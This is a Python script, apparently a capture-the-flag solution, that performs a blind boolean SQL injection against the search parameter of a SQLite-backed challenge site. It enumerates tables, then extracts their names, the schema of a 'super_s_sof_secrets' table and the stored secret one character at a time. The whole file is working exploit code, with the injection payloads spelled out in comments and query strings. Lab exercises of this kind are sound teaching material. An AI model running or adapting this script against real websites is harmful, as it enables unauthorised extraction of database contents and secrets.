import requests
import string

SERVER = "http://ssof2526.challenges.cwte.me"
PORT = 25262 

link = f"{SERVER}:{PORT}"

# Create a session to persist the cookies between requests
s = requests.Session()

# Access the first link to set the user cookie
s.get(link)

# Determine the number of tables in the database
# ' AND (SELECT COUNT(name) FROM sqlite_master WHERE type='table') =  1 --
query = "' AND (SELECT COUNT(name) FROM sqlite_master WHERE type='table') ="
for i in range(0, 20):
    response = s.get(f"{link}/?search={query}{i} -- ")
    if "Found 4 article" in response.text:
        print(response.text)
        table_count = i
        print(i)
        break

table_lengths = []

# Determine the length of each table name
# AND LENGTH((SELECT name FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET 1))=1 --
query = "' AND LENGTH((SELECT name FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET"
for table_index in range(table_count):
    for length in range(1, 50):
        r = s.get(f"{link}/?search={query} {table_index}))={length} --")
        if "Found 4 articles" in r.text:
            print(f"Table {table_index} length:", length)
            table_lengths.append(length)
            break

charset = string.ascii_lowercase + "_"
table_names = []

# Extract each table name character by character
#  AND SUBSTR((SELECT name FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET 1),1,1)='a' --
query = "' AND SUBSTR((SELECT name FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET "
for table_index, length in enumerate(table_lengths):
    name = ""
    for pos in range(1, length + 1):
        for c in charset:
            r = s.get(f"{link}/?search={query} {table_index}),{pos},1)='{c}' --")
            if "Found 4 articles" in r.text:
                name += c
                print(f"Table {table_index}: {name}")
                break
    table_names.append(name)

print("Tables:", table_names)  ### WE CAN SEE THE super_s_sof_secrets exists!!!!

# Now we know the table name, let's extract its schema and data

# Extract the length of the schema of the super_s_sof_secrets table
# AND LENGTH((SELECT sql FROM sqlite_master WHERE name='super_s_sof_secrets'))=1 --
query = "' AND LENGTH((SELECT sql FROM sqlite_master WHERE name='super_s_sof_secrets'))="
for length in range(1, 300):
    r = s.get(f"{link}/?search={query}{length} --")

    if "Found 4 articles" in r.text:
        print("Schema length:", length)
        schema_length = length
        break


schema = ""

# Extract the schema character by character
# AND SUBSTR((SELECT sql FROM sqlite_master WHERE name='super_s_sof_secrets'),1,1)='C' --
query = "' AND SUBSTR((SELECT sql FROM sqlite_master WHERE name='super_s_sof_secrets'),"
for pos in range(1, schema_length + 1):
    for c in string.printable:
        r = s.get(f"{link}/?search={query}{pos},1)='{c}' --")

        if "Found 4 articles" in r.text:
            schema += c
            print(schema)
            break


# we found this CREATE+TABLE+super_s_sof_secrets+(      id+INTEGER+NOT+NULL,+   secret+TEXT,+   PRIMARY+KEY+(id))

# Now extract the length of the secret from the super_s_sof_secrets table
# AND LENGTH((SELECT secret FROM super_s_sof_secrets LIMIT 1))=1 --
query = "' AND LENGTH((SELECT secret FROM super_s_sof_secrets LIMIT 1))="
for i in range(1, 200):
    r = s.get(f"{link}/?search={query}{i} --")

    if "Found 4 articles" in r.text:
        print("Secret length:", i)
        secret_length = i
        break

charset = string.ascii_letters + string.digits + "{}_- "
secret = ""

# Extract the secret character by character
# AND SUBSTR((SELECT secret FROM super_s_sof_secrets LIMIT 1),1,1)='C' --
query = "' AND SUBSTR((SELECT secret FROM super_s_sof_secrets LIMIT 1),"
for pos in range(1, secret_length + 1):
    for c in charset:
        r = s.get(f"{link}/?search={query}{pos},1)='{c}' --")

        if "Found 4 articles" in r.text:
            secret += c
            print(secret)
            break
